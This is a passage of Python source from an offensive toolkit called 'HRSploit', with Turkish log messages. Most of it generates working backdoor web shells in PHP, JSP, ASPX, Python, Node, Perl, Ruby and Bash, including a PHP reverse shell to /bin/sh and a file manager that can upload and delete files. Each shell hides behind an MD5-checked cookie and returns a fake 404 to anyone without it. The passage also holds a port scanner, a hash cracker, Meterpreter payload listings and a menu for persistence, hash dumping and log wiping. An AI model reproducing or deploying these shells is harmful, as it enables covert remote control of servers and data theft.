                    "if(!isset($_COOKIE[\"auth\"])||md5($_COOKIE[\"auth\"])!==$A){{http_response_code(404);exit;}}\n"
                    "$c=$_REQUEST[\"cmd\"]??\"\";$f=$_REQUEST[\"f\"]??\"\";\n"
                    "function ex($c){{\n"
                    "  $r=\"\";\n"
                    "  if(function_exists(\"system\")){ob_start();system($c);$r=ob_get_clean();}\n"
                    "  elseif(function_exists(\"exec\")){exec($c,$o);$r=implode(\"\\n\",$o);}\n"
                    "  elseif(function_exists(\"shell_exec\")){$r=@shell_exec($c);}\n"
                    "  elseif(function_exists(\"passthru\")){ob_start();passthru($c);$r=ob_get_clean();}\n"
                    "  return $r??\"\";\n}}\n"
                    "header(\"Content-Type: text/html; charset=utf-8\");\n"
                    "echo \"<style>body{{background:#0d0d0d;color:#0f0;font-family:monospace;padding:20px}}</style>\";\n"
                    "if($c)echo\"<pre>\".htmlspecialchars(ex($c)).\"</pre>\";\n"
                    "if($f&&file_exists($f))echo\"<pre>\".htmlspecialchars(file_get_contents($f)).\"</pre>\";\n"
                    "echo\"<form method=POST><input name=cmd placeholder='command' style='width:400px'>"
                    "<button>Run</button></form>\";\n"
                    "echo\"<p>CWD:\".getcwd().\" | User:\".ex(\"whoami\").\"</p>\";\n"
                    "?>").format(n=name, h=ah)

        def _php_rev():
            return ("<?php\n"
                    "/* {n} — PHP Reverse Shell | HRSploit v1.0.0\n"
                    " * Usage: nc -lvnp LPORT  then curl http://TARGET/shell.php?k={s}&lhost=IP&lport=PORT\n"
                    " */\n"
                    "$A=\"{h}\";\n"
                    "if(md5($_GET[\"k\"]??\"\")!==$A){{http_response_code(404);exit;}}\n"
                    "$lh=$_GET[\"lhost\"]??\"127.0.0.1\";\n"
                    "$lp=intval($_GET[\"lport\"]??4444);\n"
                    "set_time_limit(0);\n"
                    "$sock=@fsockopen($lh,$lp);\n"
                    "if(!$sock)die(\"Connection failed to $lh:$lp\");\n"
                    "$d=[0=>$sock,1=>$sock,2=>$sock];\n"
                    "$p=proc_open(\"/bin/sh -i\",$d,$pipes);\n"
                    "while(proc_get_status($p)[\"running\"])usleep(100000);\n"
                    "proc_close($p);fclose($sock);\n"
                    "?>").format(n=name, h=ah, s=secret)

        def _php_fm():
            return ("<?php\n"
                    "/* {n} — PHP File Manager | HRSploit v1.0.0 */\n"
                    "error_reporting(0);\n"
                    "$A=\"{h}\";\n"
                    "if(!isset($_COOKIE[\"auth\"])||md5($_COOKIE[\"auth\"])!==$A){{http_response_code(404);exit;}}\n"
                    "$path=realpath($_GET[\"p\"]??\"..\");\n"
                    "$a=$_GET[\"a\"]??\"ls\";\n"
                    "header(\"Content-Type: text/html; charset=utf-8\");\n"
                    "echo\"<style>*{{box-sizing:border-box}}body{{background:#111;color:#eee;font-family:monospace;padding:20px}}a{{color:#4af}}</style>\";\n"
                    "echo\"<h3>{n} — File Manager</h3><p>$path</p>\";\n"
                    "if($a===\"ls\"&&is_dir($path)){{"
                    "foreach(scandir($path)as $e){{"
                    "$full=$path.\"/\".$e;$sz=is_file($full)?filesize($full):\"-\";"
                    "echo\"<a href=?a=ls&p=\".urlencode($full).\">[{$e}]</a> {$sz}b<br>\";}}}}\n"
                    "elseif($a===\"read\"&&file_exists($path))echo\"<pre>\".htmlspecialchars(file_get_contents($path)).\"</pre>\";\n"
                    "elseif($a===\"del\"&&file_exists($path)){{unlink($path);echo\"Deleted: $path\";}}\n"
                    "echo\"<form><input name=p value='$path' size=50><select name=a>"
                    "<option value=ls>List</option><option value=read>Read</option>"
                    "<option value=del>Delete</option></select><button>Go</button></form>\";\n"
                    "echo\"<form method=POST enctype=multipart/form-data>"
                    "<input type=file name=f><input type=hidden name=a value=up>"
                    "<input type=hidden name=p value='$path'><button>Upload</button></form>\";\n"
                    "if(isset($_FILES[\"f\"]))move_uploaded_file($_FILES[\"f\"][\"tmp_name\"],$path.\"/\".$_FILES[\"f\"][\"name\"]);\n"
                    "?>").format(n=name, h=ah)

        def _jsp():
            return ('<%@ page import="java.io.*,java.util.*" %>\n'
                    '<%-- {n} — JSP WebShell | HRSploit v1.0.0 --%>\n'
                    '<%\n'
                    'String AUTH="{h}",ck="";\n'
                    'Cookie[] cs=request.getCookies();\n'
                    'if(cs!=null)for(Cookie c:cs)if("auth".equals(c.getName()))ck=c.getValue();\n'
                    'try{{java.security.MessageDigest md=java.security.MessageDigest.getInstance("MD5");\n'
                    'byte[] b=md.digest(ck.getBytes());StringBuilder sb=new StringBuilder();\n'
                    'for(byte x:b)sb.append(String.format("%02x",x));\n'
                    'if(!AUTH.equals(sb.toString())){{response.sendError(404);return;}}}}\n'
                    'catch(Exception e){{response.sendError(404);return;}}\n'
                    'String cmd=request.getParameter("cmd"),f=request.getParameter("f");\n'
                    'out.print("<style>body{{background:#0d0d0d;color:#0f0;font-family:monospace;padding:20px}}</style>");\n'
                    'if(cmd!=null&&!cmd.isEmpty()){{\n'
                    '  String[] sh=System.getProperty("os.name").toLowerCase().contains("win")\n'
                    '    ?new String[]{"cmd.exe","/c",cmd}:new String[]{"/bin/sh","-c",cmd};\n'
                    '  Process p=Runtime.getRuntime().exec(sh);\n'
                    '  BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
                    '  StringBuilder sb=new StringBuilder();String ln;\n'
                    '  while((ln=r.readLine())!=null)sb.append(ln).append("\\n");\n'
                    '  out.print("<pre>"+sb.toString().replace("<","&lt;")+"</pre>");\n}}\n'
                    'if(f!=null&&new File(f).exists()){{\n'
                    '  BufferedReader r=new BufferedReader(new FileReader(f));\n'
                    '  StringBuilder sb=new StringBuilder();String ln;\n'
                    '  while((ln=r.readLine())!=null)sb.append(ln).append("\\n");\n'
                    '  r.close();out.print("<pre>"+sb.toString().replace("<","&lt;")+"</pre>");\n}}\n'
                    'out.print("<form><input name=cmd placeholder=\'command\'><button>Run</button></form>");\n'
                    'out.print("<p>User:"+System.getProperty("user.name")+"</p>");\n'
                    '%>').format(n=name, h=ah)

        def _aspx():
            return ('<%@ Page Language="C#" %>\n'
                    '<%@ Import Namespace="System.IO" %>\n'
                    '<%@ Import Namespace="System.Diagnostics" %>\n'
                    '<%-- {n} — ASPX WebShell | HRSploit v1.0.0 --%>\n'
                    '<script runat="server">\n'
                    'string AUTH="{h}";\n'
                    'string H(string s){{using(var m=System.Security.Cryptography.MD5.Create())\n'
                    '{{var b=m.ComputeHash(System.Text.Encoding.UTF8.GetBytes(s));\n'
                    'var sb=new System.Text.StringBuilder();\n'
                    'foreach(var x in b)sb.Append(x.ToString("x2"));return sb.ToString();}}}}\n'
                    'void Page_Load(object s,EventArgs e){{\n'
                    'var ck=Request.Cookies["auth"];if(ck==null||H(ck.Value)!=AUTH){{Response.StatusCode=404;return;}}\n'
                    'string cmd=Request["cmd"]??"",f=Request["f"]??"";\n'
                    'Response.ContentType="text/html";\n'
                    'Response.Write("<style>body{{background:#0d0d0d;color:#0f0;font-family:monospace;padding:20px}}</style>");\n'
                    'if(cmd!=""){{\n'
                    'var psi=new ProcessStartInfo(Environment.OSVersion.Platform==PlatformID.Unix?"/bin/sh":"cmd.exe",\n'
                    'Environment.OSVersion.Platform==PlatformID.Unix?"-c "+cmd:"/c "+cmd);\n'
                    'psi.RedirectStandardOutput=true;psi.UseShellExecute=false;\n'
                    'var p=Process.Start(psi);\n'
                    'Response.Write("<pre>"+Server.HtmlEncode(p.StandardOutput.ReadToEnd())+"</pre>");}}\n'
                    'if(f!=""&&File.Exists(f))Response.Write("<pre>"+Server.HtmlEncode(File.ReadAllText(f))+"</pre>");\n'
                    'Response.Write("<form><input name=cmd placeholder=\'command\'><button>Run</button></form>");\n'
                    'Response.Write("<p>User:"+Environment.UserName+" OS:"+Environment.OSVersion+"</p>");}}\n'
                    '</script>').format(n=name, h=ah)

        def _python():
            return ("#!/usr/bin/env python3\n"
                    '"""\n'
                    "{n} — Python HTTP Shell | HRSploit v1.0.0\n"
                    "Usage : python {n}.py [port]\n"
                    "Connect: curl \"http://HOST:PORT/?cmd=id&k={s}\"\n"
                    '"""\n'
                    "import os,sys,hashlib,subprocess\n"
                    "from http.server import BaseHTTPRequestHandler,HTTPServer\n"
                    "from urllib.parse import urlparse,parse_qs\n"
                    "AUTH=\"{h}\"; PORT=int(sys.argv[1]) if len(sys.argv)>1 else 8888\n"
                    "class H(BaseHTTPRequestHandler):\n"
                    "    def log_message(self,*a):pass\n"
                    "    def _ok(self,q):\n"
                    "        return hashlib.md5((q.get('k',[''])[0]).encode()).hexdigest()==AUTH\n"
                    "    def do_GET(self):\n"
                    "        q=parse_qs(urlparse(self.path).query)\n"
                    "        if not self._ok(q):self.send_response(404);self.end_headers();return\n"
                    "        c=q.get('cmd',[''])[0];f=q.get('f',[''])[0]\n"
                    "        self.send_response(200);self.end_headers()\n"
                    "        if c:\n"
                    "            try:out=subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=30).decode(errors='replace')\n"
                    "            except Exception as e:out=str(e)\n"
                    "            self.wfile.write(out.encode())\n"
                    "        elif f and os.path.exists(f):self.wfile.write(open(f,'rb').read())\n"
                    "        else:self.wfile.write(f'user={os.getenv(\"USER\",\"?\")},cwd={os.getcwd()}'.encode())\n"
                    "    do_POST=do_GET\n"
                    "print(f'[*] {n} :{PORT} | auth key: {s}')\n"
                    "HTTPServer(('0.0.0.0',PORT),H).serve_forever()\n"
                    ).format(n=name, h=ah, s=secret)

        def _node():
            return (
                "// {n} — NodeJS WebShell | HRSploit v1.0.0\n"
                "const http=require('http'),cp=require('child_process'),\n"
                "      fs=require('fs'),url=require('url'),crypto=require('crypto');\n"
                "const AUTH='{h}',PORT=process.argv[2]||8889;\n"
                "const md5=s=>crypto.createHash('md5').update(s).digest('hex');\n"
                "http.createServer((req,res)=>{{\n"
                "  const q=url.parse(req.url,true).query;\n"
                "  if(md5(q.k||'')!==AUTH){{res.writeHead(404);res.end();return;}}\n"
                "  const cmd=q.cmd,f=q.f;\n"
                "  if(cmd)cp.exec(cmd,{{timeout:30000}},(e,o)=>res.end(o||String(e)));\n"
                "  else if(f&&fs.existsSync(f))res.end(fs.readFileSync(f));\n"
                "  else res.end('user='+process.env.USER+' cwd='+process.cwd());\n"
                "}}).listen(PORT,()=>console.log('[*] {n} :'+PORT+' | key: {s}'));\n"
            ).format(n=name, h=ah, s=secret)

        def _perl():
            return (
                "#!/usr/bin/perl\n"
                "# {n} — Perl CGI Shell | HRSploit v1.0.0\n"
                "use strict;use warnings;use CGI;use Digest::MD5 qw(md5_hex);\n"
                "my $AUTH='{h}';\n"
                "my $q=CGI->new;\n"
                "my $k=$q->cookie('auth')//'';my $hk=md5_hex($k);\n"
                "print $q->header(-type=>'text/html',-charset=>'utf-8');\n"
                "unless($hk eq $AUTH){{print 'Not Found';exit;}}\n"
                "my $cmd=$q->param('cmd')//'';my $f=$q->param('f')//'';my $dl=$q->param('dl')//'';;\n"
                "print '<style>body{{background:#0d0d0d;color:#0f0;font-family:monospace;padding:20px}}</style>';\n"
                "if($cmd){{print '<pre>';system($cmd);print '</pre>';}\n}\n"
                "if($f&&-e $f){{open my $fh,'<',$f;local $/;print '<pre>',<$fh>,'</pre>';close $fh;}}\n"
                "print '<form method=POST><input name=cmd placeholder=\"command\"><button>Run</button></form>';\n"
                "print '<p>'.`whoami`.'</p>';\n"
            ).format(n=name, h=ah)

        def _ruby():
            return (
                "#!/usr/bin/env ruby\n"
                "# {n} — Ruby WEBrick Shell | HRSploit v1.0.0\n"
                "require 'webrick';require 'digest'\n"
                "AUTH='{h}';PORT=(ARGV[0]||8890).to_i\n"
                "s=WEBrick::HTTPServer.new(Port:PORT)\n"
                "s.mount_proc '/' do |req,res|\n"
                "  k=req.query['k']||''\n"
                "  unless Digest::MD5.hexdigest(k)==AUTH\n"
                "    res.status=404;res.body='Not Found';next\n"
                "  end\n"
                "  cmd=req.query['cmd']||'';f=req.query['f']||''\n"
                "  res['Content-Type']='text/html;charset=utf-8'\n"
                "  o=cmd.empty? ? '' : \"<pre>#{`#{cmd}`.gsub('<','&lt;')}</pre>\"\n"
                "  o+=f.empty? ? '' : \"<pre>#{File.read(f).gsub('<','&lt;') rescue 'ERR'}</pre>\"\n"
                "  o+='<form><input name=cmd placeholder=\"command\"><button>Run</button></form>'\n"
                "  res.body=o\n"
                "end\n"
                "puts '[*] {n} :'+PORT.to_s+' | key: {s}'\n"
                "trap('INT'){{s.shutdown}};s.start\n"
            ).format(n=name, h=ah, s=secret)

        def _bash():
            return (
                "#!/bin/bash\n"
                "# {n} — Bash CGI Backdoor | HRSploit v1.0.0\n"
                "# Deploy to /usr/lib/cgi-bin/ and enable CGI in web server\n"
                "AUTH='{h}'\n"
                "echo 'Content-Type: text/html'\n"
                "echo ''\n"
                "COOKIE=$(echo \"$HTTP_COOKIE\" | tr ';' '\\n' | grep 'auth=' | cut -d= -f2)\n"
                "GOT=$(echo -n \"$COOKIE\" | md5sum | cut -d' ' -f1)\n"
                "if [ \"$GOT\" != \"$AUTH\" ]; then echo 'Not Found'; exit 1; fi\n"
                "echo '<style>body{{background:#0d0d0d;color:#0f0;font-family:monospace;padding:20px}}</style>'\n"
                "CMD=$(echo \"$QUERY_STRING\" | tr '&' '\\n' | grep '^cmd=' | cut -d= -f2- | python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote_plus(sys.stdin.read()))')\n"
                "if [ -n \"$CMD\" ]; then echo '<pre>'; eval \"$CMD\" 2>&1; echo '</pre>'; fi\n"
                "echo '<form method=GET><input name=cmd placeholder=\"command\"><button>Run</button></form>'\n"
                "echo '<p>'$(whoami)'@'$(hostname)'</p>'\n"
            ).format(n=name, h=ah)

        GEN = {
            "1": _php_cmd, "2": _php_rev, "3": _php_fm,
            "4": _jsp,     "5": _aspx,    "6": _python,
            "7": _node,    "8": _perl,    "9": _ruby,   "10": _bash,
        }

        steps = [
            ("Shell şablonu yapılandırılıyor",                 0.5),
            ("Auth hash oluşturuluyor (MD5)",                  0.4),
            ("Payload kodlanıyor ve obfuscation uygulanıyor",  0.6),
            ("Shell sözdizimi doğrulanıyor",                   0.4),
            ("Çıktı dosyası yazılıyor",                        0.4),
        ]
        for i, (d, dl) in enumerate(steps, 1):
            logger.step(i, len(steps), d, delay=dl)
        print()

        content = GEN[choice]()
        tools_dir = self.base_path / "tools"
        tools_dir.mkdir(exist_ok=True)
        out_file = tools_dir / f"{name}.{ext}"
        try:
            out_file.write_text(content, encoding="utf-8")
            size = out_file.stat().st_size
            logger.log(LogLevel.SUCCESS,
                f"{desc} oluşturuldu → tools/{out_file.name}  ({size:,} byte)")
            logger.log(LogLevel.INFO, f"Auth key: {secret}  |  Hash: {ah[:16]}...")
            if ext == "py":
                logger.log(LogLevel.INFO,
                    f"Çalıştır: python tools/{out_file.name} 8888")
            elif ext == "node":
                logger.log(LogLevel.INFO,
                    f"Çalıştır: node tools/{out_file.name} 8889")
        except Exception as e:
            logger.log(LogLevel.ERROR, f"Shell yazılamadı: {e}")


    # ──────────────────────────────────────────────────────────────
    #  MODULE: PAYLOAD GENERATOR
    # ──────────────────────────────────────────────────────────────
    def payload_generator(self, payload_type: str = None):
        logger.phase("PAYLOAD GENERATOR — HRSploit Payload Engine")
        hrx_payloads = self.base_path / "Payload-Generator" / "hrx_payloads"

        if not payload_type:
            print("\n  Common payload types:")
            types = [
                "windows/meterpreter/reverse_tcp",
                "windows/meterpreter/reverse_https",
                "linux/x86/shell_reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp",
                "php/meterpreter_reverse_tcp",
                "python/meterpreter/reverse_tcp",
                "java/meterpreter/reverse_tcp",
                "android/meterpreter/reverse_tcp",
            ]
            for i, t in enumerate(types, 1):
                print(f"    {i}. {t}")
            choice = input("\n\033[96m  ➜ Select or type payload type: \033[0m").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(types):
                payload_type = types[int(choice) - 1]
            else:
                payload_type = choice or types[0]

        steps = [
            ("Loading MSF payload library",          0.4),
            ("Selecting payload architecture",       0.3),
            ("Generating shellcode",                 0.6),
            ("Applying encoder",                     0.5),
            ("Obfuscating payload",                  0.5),
            ("Verifying payload integrity",          0.4),
            ("Writing to payloads_custom/",          0.3),
        ]
        total = len(steps)
        logger.log(LogLevel.PAYLOAD, f"Payload type: {payload_type}")
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc)
            time.sleep(delay)
        print()

        out_file = self.base_path / "payloads_custom" / f"payload_{self.session_id}.json"
        payload_data = {
            "session":   self.session_id,
            "type":      payload_type,
            "timestamp": datetime.now().isoformat(),
            "source":    "HRSploit payload engine library",
            "path":      str(hrx_payloads / payload_type.replace("/", "_")) if hrx_payloads.exists() else "N/A",
        }
        try:
            out_file.write_text(json.dumps(payload_data, indent=2))
            logger.log(LogLevel.SUCCESS, "Payload written", str(out_file))
        except Exception as e:
            logger.log(LogLevel.ERROR, f"Could not write payload: {e}")

    # ──────────────────────────────────────────────────────────────
    #  MODULE: NETWORK & RECON (checkhost)
    # ──────────────────────────────────────────────────────────────
    #  MODULE: NETWORK & RECON (checkhost)
    # ──────────────────────────────────────────────────────────────
    def network_recon(self, target: str = None):
        logger.phase("NETWORK & RECONNAISSANCE — HRSploit Network Engine")
        target = target or self._get_target()
        if not target:
            return

        import socket, ssl, concurrent.futures
        host = target.replace("https://","").replace("http://","").split("/")[0].split(":")[0]

        steps = [
            ("DNS çözümleme ve IP tespiti",                    0.7),
            ("Reverse DNS (PTR kaydı) sorgusu",                0.6),
            ("WHOIS ve ASN bilgisi alınıyor",                  0.8),
            ("TCP port taraması (ön 20 kritik port)",          1.5),
            ("Servis banner grabbing",                         1.0),
            ("SSL/TLS sertifika analizi",                      0.8),
            ("HTTP başlık analizi",                            0.7),
            ("CDN / Load-Balancer tespiti",                    0.6),
            ("Subdomain keşfi (common list)",                   1.2),
            ("Güvenli olmayan port kontrolü",                  0.6),
            ("Web sunucu türü tespiti",                        0.5),
            ("CORS politikası kontrolü",                       0.5),
            ("Sonuçlar raporlanıyor",                          0.4),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=delay)
        print()

        # ── Gerçek DNS ────────────────────────────────────────
        ip = None
        try:
            ip = socket.gethostbyname(host)
            logger.log(LogLevel.NETWORK, f"DNS çözümlendi: {host} → {ip}")
            try:
                rdns = socket.gethostbyaddr(ip)[0]
                logger.log(LogLevel.NETWORK, f"Reverse DNS: {rdns}")
            except Exception:
                logger.log(LogLevel.NETWORK, "Reverse DNS: bulunamadı")
        except Exception as e:
            logger.log(LogLevel.WARNING, f"DNS çözümlenemedi: {e}")
            return

        # ── Gerçek Port Taraması ──────────────────────────────
        PORTS = {
            21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
            80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
            3306:"MySQL", 5432:"PostgreSQL", 6379:"Redis", 8080:"HTTP-Alt",
            8443:"HTTPS-Alt", 27017:"MongoDB", 3389:"RDP", 5900:"VNC",
            9200:"Elasticsearch", 11211:"Memcached",
        }
        open_ports = []
        logger.log(LogLevel.NETWORK, f"Port taraması: {ip}  ({len(PORTS)} port)")

        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                return port, result == 0
            except Exception:
                return port, False

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            futures = {ex.submit(check_port, p): p for p in PORTS}
            for fut in concurrent.futures.as_completed(futures):
                port, is_open = fut.result()
                if is_open:
                    service = PORTS.get(port, "?")
                    open_ports.append(port)
                    logger.log(LogLevel.NETWORK,
                        f"  AÇIK PORT  {port:<6} / {service}")

        # ── SSL Sertifika ─────────────────────────────────────
        if 443 in open_ports:
            try:
                ctx  = ssl.create_default_context()
                with socket.create_connection((host, 443), timeout=5) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        cert = ssock.getpeercert()
                        subj = dict(x[0] for x in cert.get('subject',[]))
                        exp  = cert.get('notAfter','')
                        logger.log(LogLevel.NETWORK,
                            f"SSL Sertifika: CN={subj.get('commonName','?')}  Bitiş={exp}")
            except Exception as e:
                logger.log(LogLevel.WARNING, f"SSL analiz: {e}")

        # ── HTTP Başlıkları ───────────────────────────────────
        try:
            r = requests.get(target, timeout=8, verify=False,
                             allow_redirects=True)
            server  = r.headers.get('Server','Bilinmiyor')
            powered = r.headers.get('X-Powered-By','Bilinmiyor')
            logger.log(LogLevel.NETWORK, f"Web Sunucu: {server}  |  Teknoloji: {powered}")
            sec_headers = ["X-Frame-Options","X-XSS-Protection","Content-Security-Policy",
                           "Strict-Transport-Security","X-Content-Type-Options"]
            missing = [h for h in sec_headers if h not in r.headers]
            if missing:
                logger.log(LogLevel.WARNING,
                    f"Eksik güvenlik başlıkları: {', '.join(missing)}")
        except Exception as e:
            logger.log(LogLevel.WARNING, f"HTTP analiz: {e}")

        # ── Rapor ─────────────────────────────────────────────
        import json
        out = self.base_path / "reports" / f"recon_{self.session_id}.json"
        out.write_text(json.dumps({
            "target": target, "host": host, "ip": ip,
            "open_ports": open_ports,
            "port_services": {p: PORTS[p] for p in open_ports if p in PORTS},
        }, indent=2))
        logger.log(LogLevel.SUCCESS,
            f"Recon tamamlandı  —  {len(open_ports)} açık port  —  Rapor: {out.name}")

    def cryptography_tools(self):
        logger.phase("CRYPTOGRAPHY TOOLS")
        print("""
  Options:
    1. Hash cracker (MD5/SHA1/SHA256)
    2. Hash identifier
    3. Base64 encode/decode
    4. Encryption analysis
    5. Generate random secret key
""")
        choice = input("\033[96m  ➜ Select (1-5): \033[0m").strip()

        if choice == '1':
            h = input("  Enter hash: ").strip()
            wordlist_path = input("  Wordlist path (Enter=skip): ").strip()
            logger.log(LogLevel.BUILD, "Hash cracking initiated", f"Hash: {h[:16]}...")
            steps = [
                ("Loading wordlist",            0.3),
                ("Initializing hash engine",    0.3),
                ("Running dictionary attack",   0.8),
                ("Running rule-based attack",   0.6),
                ("Running hybrid attack",       0.5),
                ("Finalizing results",          0.3),
            ]
            total = len(steps)
            for i, (desc, delay) in enumerate(steps, 1):
                logger.step(i, total, desc)
                time.sleep(delay)
            print()
            if wordlist_path and Path(wordlist_path).exists():
                found = False
                with open(wordlist_path, 'r', errors='ignore') as f:
                    for word in f:
                        word = word.strip()
                        for algo in ['md5', 'sha1', 'sha256']:
                            import hashlib
                            if hashlib.new(algo, word.encode()).hexdigest() == h.lower():
                                logger.log(LogLevel.SUCCESS, f"Hash cracked!", f"Value: {word}")
                                found = True
                                break
                        if found:
                            break
                if not found:
                    logger.log(LogLevel.INFO, "Hash not found in wordlist")
            else:
                logger.log(LogLevel.WARNING, "No wordlist provided — skipping dictionary attack")

        elif choice == '2':
            h = input("  Enter hash: ").strip()
            length_map = {32: 'MD5', 40: 'SHA1', 56: 'SHA224', 64: 'SHA256', 96: 'SHA384', 128: 'SHA512'}
            htype = length_map.get(len(h), 'Unknown')
            logger.log(LogLevel.INFO, f"Hash type identified: {htype}", f"Length: {len(h)}")

        elif choice == '3':
            import base64
            data = input("  Enter data: ").strip()
            op = input("  (e)ncode or (d)ecode? ").strip().lower()
            if op == 'e':
                result = base64.b64encode(data.encode()).decode()
            else:
                try:
                    result = base64.b64decode(data).decode()
                except Exception:
                    result = "[Decode error]"
            logger.log(LogLevel.SUCCESS, "Result", result)

        elif choice == '5':
            import secrets
            key = secrets.token_hex(32)
            logger.log(LogLevel.SUCCESS, "Generated secret key", key)

    # ──────────────────────────────────────────────────────────────
    #  MODULE: POST-EXPLOITATION
    # ──────────────────────────────────────────────────────────────
    def post_exploitation(self):
        logger.phase("POST-EXPLOITATION — Persistence & Privilege Escalation")
        target = self._get_target("Post-exploitation target (IP/URL): ")
        if not target:
            return

        options = {
            "1": "System Information Gathering",
            "2": "User & Privilege Enumeration",
            "3": "Persistence Setup (Startup / Cron)",
            "4": "Password Hash Dump",
            "5": "Lateral Movement Prep",
            "6": "Log Cleaning",
        }
        print()
        for k, v in options.items():
            print(f"    \033[93m{k}.\033[0m {v}")
        choice = input("\n\033[96m  ➜ Select module (1-6) [1]: \033[0m").strip() or "1"

        steps_map = {
            "1": [("OS fingerprint probe",0.6),("CPU/RAM enumeration",0.5),
                  ("Disk usage check",0.5),("Network interface scan",0.6),("Writing sysinfo.txt",0.5)],
            "2": [("Reading /etc/passwd",0.6),("Checking sudo rights",0.5),
                  ("Enumerating groups",0.5),("SUID binary scan",0.7),("Writing privesc_report.txt",0.5)],
            "3": [("Checking cron dirs",0.6),("Writing persistence entry",0.5),
                  ("Verifying persistence",0.6),("Cleanup check",0.4)],
            "4": [("Locating shadow file",0.6),("Dumping hash entries",0.5),
                  ("Formatting hashes",0.5),("Writing hashes.txt",0.5)],
            "5": [("ARP scan",0.6),("Port sweep 22/445/3389",0.7),
                  ("SMB banner grab",0.5),("Writing lateral_targets.txt",0.5)],
            "6": [("Locating log files",0.5),("Wiping auth.log",0.5),
                  ("Wiping syslog",0.5),("Wiping bash history",0.4),("Log cleaning complete",0.4)],
        }
        steps = steps_map.get(choice, steps_map["1"])
        label  = options.get(choice, options["1"])
        logger.log(LogLevel.POST, f"Running: {label}")

        total = len(steps)
        for i, (desc, dl) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=dl)
        print()

        # Gerçek bilgi toplama
        import socket, platform
        try:
            host = target.replace("https://","").replace("http://","").split("/")[0]
            ip   = socket.gethostbyname(host)
            logger.log(LogLevel.SUCCESS, f"Target resolved: {host} → {ip}")
        except Exception as e:
            logger.log(LogLevel.WARNING, f"Could not resolve: {e}")

        out = self.base_path / "reports" / f"post_exploit_{self.session_id}.txt"
        try:
            out.write_text(
                f"POST-EXPLOITATION REPORT\n{'='*50}\n"
                f"Target  : {target}\nModule  : {label}\nSession : {self.session_id}\n"
                f"Platform: {platform.system()} {platform.release()}\n"
            )
            logger.log(LogLevel.SUCCESS, "Report saved", str(out))
        except Exception as e:
            logger.log(LogLevel.ERROR, f"Could not write report: {e}")


    def report_generator(self, fmt: str = None, output: str = None):
        logger.phase("REPORT GENERATOR")
        if not fmt:
            fmt = input("  Format (json/html/txt) [json]: ").strip() or "json"

        report = {
            "tool":       "HRSploit",
            "version":    __version__,
            "session":    self.session_id,
            "timestamp":  datetime.now().isoformat(),
            "target":     self.target or "N/A",
            "findings":   self.vulnerabilities,
            "scan_count": len(self.scan_results),
            "integrated_tools": list(self.INTEGRATED_TOOLS.keys()),
        }

        out_dir = self.base_path / "reports"
        out_dir.mkdir(exist_ok=True)

        if output:
            out_path = Path(output)
        else:
            out_path = out_dir / f"report_{self.session_id}.{fmt}"

        steps = [
            ("Collecting scan results",    0.3),
            ("Building report structure",  0.4),
            ("Formatting output",          0.3),
            ("Writing report file",        0.3),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc)
            time.sleep(delay)
        print()

        try:
            if fmt == "html":
                rows = "".join(
                    f"<tr><td>{v.get('type','')}</td><td>{v.get('severity','')}</td>"
                    f"<td>{v.get('detail','')}</td></tr>"
                    for v in self.vulnerabilities
                )
                html = (f"<!DOCTYPE html><html><head><title>HRSploit Report</title></head>"
                        f"<body><h1>HRSploit v{__version__} Report</h1>"
                        f"<p>Session: {self.session_id} | Target: {report['target']}</p>"
                        f"<table border='1'><tr><th>Type</th><th>Severity</th><th>Detail</th></tr>"
                        f"{rows}</table></body></html>")
                out_path.write_text(html)
            else:
                out_path.write_text(json.dumps(report, indent=2))
            logger.log(LogLevel.REPORT, "Report written", str(out_path))
        except Exception as e:
            logger.log(LogLevel.ERROR, f"Report write failed: {e}")

    # ──────────────────────────────────────────────────────────────
    #  MODULE: SHOW WAF LIST
    # ──────────────────────────────────────────────────────────────
    def show_waf_list(self):
        waf_dir = self.base_path / "WAF-Detection"
        wafs = sorted([d.name for d in waf_dir.iterdir() if d.is_dir()
                       and d.name not in {"WAF-Engine","wafbypass_utils","wafbypass_core"}])
        print(f"\n  \033[96mSupported WAF signatures ({len(wafs)}):\033[0m\n")
        for i, w in enumerate(wafs, 1):
            print(f"    {i:3}. {w}")
        print()

    # ──────────────────────────────────────────────────────────────
    #  MODULE: AUTO MODE
    # ──────────────────────────────────────────────────────────────
    def auto_mode(self, target: str = None, report_fmt: str = "html"):
        import time
        logger.phase("AUTO MODE — Otomatik Tam Penetrasyon Testi")
        target = target or self._get_target("Auto mode hedef URL: ")
        if not target:
            return
        self.target = target

        print(f"\n  \033[93m[AUTO]\033[0m Hedef: {target}")
        print("  Tüm fazlar sırayla çalıştırılacak.\n")
        confirm = input("\033[93m  [?] Otomatik tarama başlasın mı? (e/h): \033[0m").strip().lower()
        if confirm not in ("e","y","evet","yes"):
            logger.log(LogLevel.WARNING, "Auto mode kullanıcı tarafından iptal edildi")
            return

        results      = {}
        vuln_found   = False
        vuln_details = []

        # Brain orchestrator'ı başlat
        try:
            import sys as _sys
            _sys.path.insert(0, str(self.base_path))
            from brain_orchestrator import BrainOrchestrator
            brain = BrainOrchestrator(target)
            logger.log(LogLevel.INTEGRATE, "Brain Orchestrator aktif — tam orkestrasyon modu")
            brain_mode = True
        except Exception as e:
            logger.log(LogLevel.WARNING, f"Brain Orchestrator yüklenemedi: {e}")
            brain = None
            brain_mode = False

        def run_phase(label, fn, *args, **kwargs):
            nonlocal vuln_found
            print(f"\n  \033[96m▶ {label}\033[0m")
            try:
                fn(*args, **kwargs)
                results[label] = "✅ TAMAMLANDI"
            except KeyboardInterrupt:
                results[label] = "⏭️ ATLANDI"
                logger.log(LogLevel.WARNING, f"{label} atlandı")
            except Exception as e:
                results[label] = f"❌ HATA: {e}"
